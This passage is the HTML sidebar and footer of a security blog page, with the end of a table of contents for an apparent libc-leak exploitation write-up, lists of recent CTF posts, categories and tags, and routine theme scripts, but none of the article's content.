Code</span></span></a></li><li><a class="level is-mobile" href="#The-Libc-Leak"><span class="level-left"><span class="level-item">5</span><span class="level-item">The Libc Leak</span></span></a></li><li><a class="level is-mobile" href="#Code-Execution"><span class="level-left"><span class="level-item">6</span><span class="level-item">Code Execution</span></span></a></li><li><a class="level is-mobile" href="#Code-Execution-1"><span class="level-left"><span class="level-item">7</span><span class="level-item">Code Execution</span></span></a></li><li><a class="level is-mobile" href="#Exploit-Code"><span class="level-left"><span class="level-item">8</span><span class="level-item">Exploit Code</span></span></a><ul class="menu-list"><li><a class="level is-mobile" href="#Exploit-Execution"><span class="level-left"><span class="level-item">8.1</span><span class="level-item">Exploit Execution</span></span></a></li></ul></li><li><a class="level is-mobile" href="#Conclusion"><span class="level-left"><span class="level-item">9</span><span class="level-item">Conclusion</span></span></a></li></ul></div></div><style>#toc .menu-list>li>a.is-active+.menu-list{display:block}#toc .menu-list>li>a+.menu-list{display:none}</style><script src="/js/toc.js" defer></script></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">Recents</h3><article class="media"><div class="media-content"><p class="date"><time datetime="2021-02-14T18:30:00.000Z">2021-02-15</time></p><p class="title"><a href="/2021/02/15/arm-architecture-webinar/">ARM Architecture and Shellcode Webinars</a></p><p class="categories"><a href="/categories/Binary-Exploitation/">Binary Exploitation</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time datetime="2020-07-17T18:30:00.000Z">2020-07-18</time></p><p class="title"><a href="/2020/07/18/binary-exploitation-pwnable-tw-tcache-tear/">Binary Exploitation [pwnable.tw] - Tcache Tear</a></p><p class="categories"><a href="/categories/CTF-Writeups/">CTF Writeups</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time datetime="2020-07-11T18:30:00.000Z">2020-07-12</time></p><p class="title"><a href="/2020/07/12/binary-exploitation-pwnable-tw-caov/">Binary Exploitation [pwnable.tw] - CAOV</a></p><p class="categories"><a href="/categories/CTF-Writeups/">CTF Writeups</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time datetime="2020-07-10T18:30:00.000Z">2020-07-11</time></p><p class="title"><a href="/2020/07/11/binary-exploitation-pwnable-tw-spirited-away/">Binary Exploitation [pwnable.tw] - Spirited Away</a></p><p class="categories"><a href="/categories/CTF-Writeups/">CTF Writeups</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time datetime="2020-07-04T18:30:00.000Z">2020-07-05</time></p><p class="title"><a href="/2020/07/05/binary-exploitation-pwnable-tw-realloc/">Binary Exploitation [pwnable.tw] - Realloc</a></p><p class="categories"><a href="/categories/CTF-Writeups/">CTF Writeups</a></p></div></article></div></div><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">Categories</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/Binary-Exploitation/"><span class="level-start"><span class="level-item">Binary Exploitation</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Brain-Logs/"><span class="level-start"><span class="level-item">Brain Logs</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/CTF-Writeups/"><span class="level-start"><span class="level-item">CTF Writeups</span></span><span class="level-end"><span class="level-item tag">13</span></span></a></li><li><a class="level is-mobile" href="/categories/Exploitation/"><span class="level-start"><span class="level-item">Exploitation</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/IoT/"><span class="level-start"><span class="level-item">IoT</span></span><span class="level-end"><span class="level-item tag">5</span></span></a></li><li><a class="level is-mobile" href="/categories/Machine-Learning/"><span class="level-start"><span class="level-item">Machine Learning</span></span><span class="level-end"><span class="level-item tag">3</span></span></a></li><li><a class="level is-mobile" href="/categories/Malware-Analysis/"><span class="level-start"><span class="level-item">Malware Analysis</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/categories/NLP/"><span class="level-start"><span class="level-item">NLP</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/Reverse-Engineering/"><span class="level-start"><span class="level-item">Reverse Engineering</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li></ul></div></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">Tags</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/ACS712/"><span class="tag">ACS712</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Arduino/"><span class="tag">Arduino</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Bare-Metal/"><span class="tag">Bare-Metal</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/CTF/"><span class="tag">CTF</span><span class="tag">13</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Chat-Bots/"><span class="tag">Chat Bots</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Classification/"><span class="tag">Classification</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Data-Wrangling/"><span class="tag">Data Wrangling</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Dev/"><span class="tag">Dev</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Dropper/"><span class="tag">Dropper</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ESP8266/"><span class="tag">ESP8266</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Editor/"><span class="tag">Editor</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Emacs/"><span class="tag">Emacs</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Exploitation/"><span class="tag">Exploitation</span><span class="tag">2</span></a></div><div class="control"><a class="tags has-addons" href="/tags/GandCrab/"><span class="tag">GandCrab</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Grey-Energy/"><span class="tag">Grey Energy</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Heap-Exploitation/"><span class="tag">Heap Exploitation</span><span class="tag">4</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Kernel-Debugging/"><span class="tag">Kernel Debugging</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux/"><span class="tag">Linux</span><span class="tag">15</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Linux-Malware/"><span class="tag">Linux Malware</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Malware-Analysis/"><span class="tag">Malware Analysis</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Python/"><span class="tag">Python</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/ROP/"><span class="tag">ROP</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Regression/"><span class="tag">Regression</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Reverse-Engineering/"><span class="tag">Reverse Engineering</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Visualization/"><span class="tag">Visualization</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/WarGames/"><span class="tag">WarGames</span><span class="tag">5</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Windows-Malware/"><span class="tag">Windows Malware</span><span class="tag">3</span></a></div><div class="control"><a class="tags has-addons" href="/tags/Windows-Reversing/"><span class="tag">Windows Reversing</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/glibc/"><span class="tag">glibc</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/javascript-obfuscation/"><span class="tag">javascript obfuscation</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwnable/"><span class="tag">pwnable</span><span class="tag">13</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwnable-kr/"><span class="tag">pwnable-kr</span><span class="tag">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/pwnable-tw/"><span class="tag">pwnable-tw</span><span class="tag">6</span></a></div><div class="control"><a class="tags has-addons" href="/tags/radare2/"><span class="tag">radare2</span><span class="tag">4</span></a></div></div></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/images/logo-header.png" alt="Tainted Bits" height="28"></a><p class="is-size-7"><span>&copy; 2021 D3xt3r</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by-sa/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Subscribe" href="https://mailchi.mp/d744c1f04904/taintedbits"><i class="fa fa-envelope"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/0xd3xt3r"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en")</script><script>var IcarusThemeSettings={article:{highlight:{clipboard:!0,fold:"unfolded"}}}</script><script src="/js/column.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load",()=>{"function"==typeof $.fn.lightGallery&&$(".article").lightGallery({selector:".gallery-item"}),"function"==typeof $.fn.justifiedGallery&&($(".justified-gallery > p > .gallery-item").length&&$(".justified-gallery > p > .gallery-item").unwrap(),$(".justified-gallery").justifiedGallery())})</script><div id="outdated"><h6>Your browser is out-of-date!</h6><p>Update your browser to view this website correctly.&amp;npsb;<a id="btnUpdateBrowser" target="_blank" rel="noopener" href="http://outdatedbrowser.com/">Update my browser now</a></p><p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">×</a></p></div><script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script><script>window.addEventListener("load",(function(){outdatedBrowser({bgColor:"#f25648",color:"#ffffff",lowerThan:"object-fit"})}))</script><a id="back-to-top" title="Back to top" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="Type something..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener("DOMContentLoaded",(function(){loadInsight({contentUrl:"/content.json"},{hint:"Type something...",untitled:"(Untitled)",posts:"Posts",pages:"Pages",categories:"Categories",tags:"Tags"})}))</script></body></html>